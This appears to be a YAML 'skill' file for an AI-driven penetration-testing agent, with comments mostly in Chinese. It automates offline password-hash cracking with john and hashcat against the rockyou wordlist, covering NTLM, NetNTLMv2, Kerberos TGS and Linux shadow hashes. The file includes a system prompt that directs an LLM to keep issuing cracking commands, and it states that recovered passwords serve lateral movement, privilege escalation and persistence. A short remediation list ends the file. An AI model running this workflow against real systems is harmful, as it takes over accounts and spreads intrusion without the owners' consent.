skill_id: hash_cracking
name: "Password Hash Cracking"
category: credential
phase: foothold
version: "1.0"

principle: |
  获取到密码哈希后（NTLM、NTLMv2、NetNTLMv1/v2、Kerberos TGS-REP、
  SHA/MD5 crypt、SSH 私钥密码），使用 john/hashcat 进行离线密码破解。
  破解成功后凭据可用于横向移动、提权或持久化。

match:
  rules:
    - variable_present: ["hashes_raw"]
    - variable_present: ["ntlm_hash"]
    - variable_present: ["netntlmv2_hash"]
    - variable_present: ["kerberos_hash"]
    - variable_present: ["shadow_hash"]
    - evidence_contains: ["hash"]
    - evidence_contains: ["$krb5tgs$"]
    - evidence_contains: ["$NT$"]

probes:
  - id: detect_hash_type
    description: "检测哈希类型并准备破解"
    command: |
      echo "[*] 哈希破解准备"
      if [ -n "$hashes_raw" ]; then
        echo "$hashes_raw" > /tmp/hashes_to_crack.txt
      elif [ -n "$ntlm_hash" ]; then
        echo "$ntlm_hash" > /tmp/hashes_to_crack.txt
      elif [ -n "$netntlmv2_hash" ]; then
        echo "$netntlmv2_hash" > /tmp/hashes_to_crack.txt
      else
        echo "[-] 无可用的哈希值" > /tmp/hashes_to_crack.txt
      fi
      echo "HASHES_PREPARED"
    timeout: 10
    parse_rules:
      - if_contains: ["HASHES_PREPARED"]
        set: { hashes_ready: true }

exploit_paths:
  - path_id: john_hash_crack
    name: "John the Ripper 破解"
    priority: 1
    conditions:
      hashes_ready: true
    steps:
      - id: john_crack
        description: "使用 john 破解密码哈希"
        command: |
          echo "[*] John the Ripper 哈希破解"
          john --wordlist=/usr/share/wordlists/rockyou.txt.gz /tmp/hashes_to_crack.txt --format=nt 2>&1 | head -30 || true
          john --wordlist=/usr/share/wordlists/rockyou.txt.gz /tmp/hashes_to_crack.txt 2>&1 | head -30 || true
          echo "[*] 破解结果"
          john --show /tmp/hashes_to_crack.txt 2>&1 | head -20 || true
          echo "JOHN_CRACK_DONE"
        timeout: 600
        success_criteria:
          stdout_contains_any: ["JOHN_CRACK_DONE"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "hash_crack"

  - path_id: hashcat_crack
    name: "hashcat 破解（fallback）"
    priority: 2
    conditions:
      hashes_ready: true
    steps:
      - id: hashcat_crack
        description: "使用 hashcat 破解"
        command: |
          echo "[*] hashcat 哈希破解"
          hashcat -m 1000 -a 0 /tmp/hashes_to_crack.txt /usr/share/wordlists/rockyou.txt.gz --force 2>&1 | head -30 || true
          hashcat -a 0 /tmp/hashes_to_crack.txt /usr/share/wordlists/rockyou.txt.gz --force 2>&1 | head -30 || true
          echo "[*] 破解结果"
          hashcat --show /tmp/hashes_to_crack.txt 2>&1 | head -20 || true
          echo "HASHCAT_CRACK_DONE"
        timeout: 900
        success_criteria:
          stdout_contains_any: ["HASHCAT_CRACK_DONE"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "hash_crack"

  - path_id: llm_freeform
    name: "LLM 自由推理（哈希破解策略调整）"
    priority: 99
    mode: react_freeform
    max_rounds: 5

llm:
  max_rounds: 5
  freeform_system_prompt: |
    【漏洞范围】密码哈希破解
    【严格限制】
    - 只能尝试哈希破解（john/hashcat）
    - NT hashes 用 --format=nt (john) 或 -m 1000 (hashcat)
    - NetNTLMv2 用 -m 5600 (hashcat)
    - Kerberos TGS 用 -m 13100 (hashcat)
    - Linux shadow 用 --format=sha512crypt (john)
    - 每次只生成一条命令
    【判定标准】
    - 破解成功后会显示 "password" 或明文密码

remediation: |
  1. 强制使用强密码策略（14+ 字符、复杂度要求）
  2. 启用 Windows Defender Credential Guard
  3. 限制 LSASS 访问，启用 LSA Protection
  4. 使用 Windows Hello for Business 或 FIDO2 令牌
